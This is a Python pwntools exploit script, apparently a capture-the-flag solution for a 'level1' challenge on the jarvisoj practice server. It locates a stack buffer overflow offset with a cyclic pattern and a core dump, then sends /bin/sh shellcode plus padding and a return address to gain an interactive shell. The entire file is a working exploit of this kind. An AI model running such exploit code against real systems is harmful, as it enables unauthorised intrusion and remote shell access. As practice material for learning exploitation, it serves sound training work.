from pwn import *


context.arch = "i386"
context.terminal = ['tmux', 'splitw', '-h']

class Pwn(object):

    def __init__(self, binary_file=None, remote=None):
        self.remote_sign = False
        if binary_file:
            self.binary_file = binary_file
   
        if remote:
            self.host = remote['host']
            self.port = remote['port']
            self.remote_sign = True


    def get_overflow_position(self):
        io = self.get_io()
        io.recvuntil("?\n")
        io.send(cyclic(500))
        io.recvall()

        if os.path.isfile('./core'):
            core = Core('./core')
            self.eip = cyclic_find(p32(core.eip))


    def get_io(self):
        io = None
        if self.remote_sign:
            io = remote(self.host, self.port)
        else:
            io = process(self.binary_file)
        return io

    
    def get_shell(self):
        io = self.get_io()
        shellcode_addr = io.recvline()[14:-2]
        shellcode_addr = int(shellcode_addr, 16)

        shellcode = asm(shellcraft.sh())
        payload = shellcode + 'a' * (self.eip-len(shellcode)) + p32(shellcode_addr)
        io.send(payload)
        io.interactive()


def main():
    # pwn = Pwn(binary_file='./level1')
    pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9877})
    pwn.get_overflow_position()
    pwn.get_shell()


if __name__ == "__main__":
    main()
